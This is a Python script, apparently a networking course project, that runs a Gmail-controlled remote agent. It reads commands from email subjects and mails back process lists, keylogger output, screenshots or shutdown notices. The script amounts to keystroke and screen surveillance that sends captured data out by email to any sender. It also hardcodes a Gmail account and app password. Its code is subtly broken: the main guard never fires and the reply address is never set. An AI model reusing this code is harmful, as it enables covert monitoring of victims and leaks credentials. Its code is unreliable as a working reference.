# -------------------------------------------------------------------------------------------------
# THINGS WILL BE USED

import smtplib
import imaplib
import email
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.header import decode_header
import screenshot
import shutdown
from process_app import *
from keylogger import key_logger

import UI

smtp_server = 'smtp.gmail.com'  # SMTP server for Gmail
smtp_port = 587  # Port for TLS

emailJson = "email.json"

username_checker = 'mangmaytinhremotecontrol@gmail.com'
password_checker = 'lmlx vrwx cwym hvqz'
username_receiver = ""
# -------------------------------------------------------------------------------------------------
# CONNECT + LOGIN

imap = imaplib.IMAP4_SSL(host='imap.gmail.com', port=993)
imap.login(username_checker, password_checker)

# -------------------------------------------------------------------------------------------------
# SEND MAIL


def send_email(subject, body, image_data=None):
    msg = MIMEMultipart()
    msg["From"] = username_checker
    msg["To"] = username_receiver
    msg["Subject"] = subject
    msg.attach(MIMEText(body, "plain"))
    if image_data is not None:
        image = MIMEImage(image_data, name="image.png")
        msg.attach(image)
    text = msg.as_string()
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(username_checker, password_checker)
    server.sendmail(username_checker, username_receiver, text)
    server.quit()

# -------------------------------------------------------------------------------------------------
# READ MAIL


def CheckAndDo(cmd):
    if  'applications' in cmd:
        send_email("List of applications:", execute_msg(cmd))
    elif 'processes' in cmd:
        send_email( "List of processes:", execute_msg(cmd))
    elif 'keylogger' in cmd:
        parts = cmd.split(' ')
        duration = int(parts[1]) if len(parts) > 1 else 10
        send_email("Keys pressed:", key_logger(duration))
    elif 'screenshot' in  cmd:
        image_data = screenshot.screen_shot()
        send_email("Screenshot Taken!", "See attachment: ", image_data)
    elif 'shutdown' in cmd:
        send_email("Shutting Down PC!", "PC is shutting down...")
        shutdown.shutdown()


def MailChecker():
    cmd = 'start'
    emails = UI.load_emails_from_json(emailJson)
    while cmd != 'quit':
        imap.select("Inbox")
        # Find all unseen mails in Inbox to read
        res, mailIds = imap.search(None, '(UNSEEN)')

        # Read every unseen mail
        for id in mailIds[0].decode().split():
            res, mailData = imap.fetch(id, '(RFC822)')
            message = email.message_from_string(mailData[0][1].decode())

            # Get message from Subject part of the mail
            cmd = message.get("Subject")
            username_receiver = message.get("From")
            CheckAndDo(cmd.lower())
            
            new_email = UI.Email(sender=username_receiver, subject=cmd, snippet="", read=False)
            emails.append(new_email)  

        UI.save_emails_to_json(emails, emailJson)

        imap.close()

        time.sleep(0.4)

    print("Bye !!!")
    imap.logout()

# -----------------------------------------------------------------------------------------
if __name__ == "main":
    MailChecker()